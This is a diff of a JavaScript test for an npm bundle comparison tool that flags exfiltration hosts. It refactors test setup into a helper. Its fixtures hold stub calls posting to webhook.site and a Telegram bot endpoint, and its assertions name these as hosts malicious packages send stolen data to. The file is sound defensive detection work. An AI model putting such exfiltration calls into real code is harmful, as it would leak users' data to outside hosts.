@@ -504,15 +504,9 @@ test('a file is labelled with what its code can run beyond itself, in its head a
 })
 
 test('a file naming an exfiltration host is tagged so in its head and the tree, a service new to it saying so', () => {
-  const version = (integrity, files) => ({ integrity, kind: 'sourcemap', json: { version: 3, sources: Object.keys(files), sourcesContent: Object.values(files) } })
   const base = version('a', { 'lib/send.js': 'post("https://webhook.site/x")\n', 'lib/gone.js': 'bot("https://api.telegram.org/bot")\n' })
   const other = version('b', { 'lib/send.js': 'post("https://webhook.site/x")\nbot("https://api.telegram.org/bot")\n' })
-  const element = new CompareCode()
-  Object.assign(element, { base, other, baseName: 'a', otherName: 'b', resolutions: [],
-    files: computeBundleDiff(bundleFilesAsMap(base), bundleFilesAsMap(other), () => '__own__').files })
-  element.willUpdate(new Map([['base'], ['other'], ['files'], ['resolutions']]))
-  const render = path => { element.path = path; return renderText(element.render()) }
-  const head = path => /<header class="bundle-code-main-bar bundle-compare-code-bar">([^]*?)<\/header>/u.exec(render(path))[1]
+  const { render, head } = compareOf(base, other, { baseName: 'a', otherName: 'b' })
   const tags = markup => [...markup.matchAll(/class="npm-exfiltration" data-tooltip=([^>]*)>Exfiltration</gu)].map(m => m[1])
   assert.deepEqual(tags(head('lib/send.js')), ['Names a host malicious packages send what they take to: webhook.site (line 1), Telegram (line 2, new)'])
   assert.deepEqual(tags(head('lib/gone.js')), ['Names a host malicious packages send what they take to: Telegram (line 1)'], 'a removed file as it was')
